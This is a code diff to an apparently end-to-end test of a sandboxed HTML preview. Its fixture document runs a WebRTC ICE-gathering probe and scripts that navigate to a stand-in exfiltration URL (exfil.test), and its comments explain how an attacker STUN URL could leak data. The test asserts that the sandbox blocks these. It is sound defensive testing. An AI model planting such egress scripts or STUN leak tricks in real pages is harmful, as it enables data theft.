@@ -20,6 +20,8 @@ import { ensureTerminalVisible, waitForActiveWorktree, waitForSessionReady } fro
 const FIXTURE_NAME = 'paired-html-focus.html'
 const FIXTURE_HEADING = 'paired html preview'
 const EXTERNAL_LINK_URL = 'https://example.com/from-preview'
+/** Stands in for the exfiltration a previewed document would attempt on its own, with no one at the keyboard. */
+const SCRIPTED_EGRESS_URL = 'https://exfil.test/?d=scripted'
 
 /**
  * Since STA-5557 a paired HTML preview renders locally from the workspace's disk over the
@@ -37,6 +39,25 @@ test('renders a paired HTML doc locally without creating any browser page', asyn
     `<!doctype html><html><body><h1>${FIXTURE_HEADING}</h1>` +
       `<p><a id="external" href="${EXTERNAL_LINK_URL}" target="_blank" ` +
       `style="display:inline-block;padding:24px;font-size:24px">external link</a></p>` +
+      `<div id="webrtc-probe">pending</div>` +
+      // Why the document probes itself rather than the harness evaluating in it: `executeJavaScript`
+      // enters the guest from outside, so only an inline script measures what the document can do.
+      // Why candidates and not the constructor: this Chromium lets any document construct a peer
+      // connection, and an attacker-owned STUN URL leaks its bytes during gathering with no
+      // signaling at all. Zero candidates is the fence; a throw was never going to be one.
+      `<script>(async()=>{const out=document.getElementById('webrtc-probe');try{` +
+      `const pc=new RTCPeerConnection();const found=[];` +
+      `pc.onicecandidate=(event)=>{if(event.candidate&&event.candidate.candidate){found.push(1)}};` +
+      `pc.createDataChannel('probe');` +
+      `await pc.setLocalDescription(await pc.createOffer());` +
+      `await new Promise((resolve)=>setTimeout(resolve,2000));` +
+      `out.textContent='candidates='+found.length}` +
+      `catch(error){out.textContent='threw:'+error.name}})()</script>` +
+      // Why the document tries to leave by itself: a preview may read its whole grant over
+      // `connect-src 'self'`, so an unattended navigation to an attacker is how those bytes would
+      // get out. It runs on every load here; the baseline browser counts below are the oracle.
+      `<script>try{window.open('${SCRIPTED_EGRESS_URL}','_blank')}catch(error){}` +
+      `location.href='${SCRIPTED_EGRESS_URL}'</script>` +
       `</body></html>\n`
   )
   await waitForSessionReady(orcaPage)
@@ -137,8 +158,18 @@ test('renders a paired HTML doc locally without creating any browser page', asyn
       })
       .toBe(FIXTURE_HEADING)
     expect(await readDocPreviewGuestUrl(page)).toMatch(/^orca-preview:\/\//)
+    // Why a live check: the fence is a main-process call on the guest, and nothing in the served
+    // document or its headers would show whether it took. Gathering nothing is the proof.
+    await expect
+      .poll(() => readDocPreviewRenderedText(page, '#webrtc-probe'), {
+        timeout: 30_000,
+        message: 'the preview document never reported its ICE gathering result'
+      })
+      .toBe('candidates=0')
 
     const afterPreview = await readPairedHtmlPreviewInventory(page, inventoryArgs)
+    // The document has already run its unattended `window.open` and `location.href` by now, since
+    // the heading it painted comes after them: holding the baseline is that egress reaching nothing.
     expect(afterPreview.previewOpenFileModes).toEqual(['html-preview'])
     expect(afterPreview.previewTabs[0]?.groupId).not.toBe(sourceGroupId)
     expect({
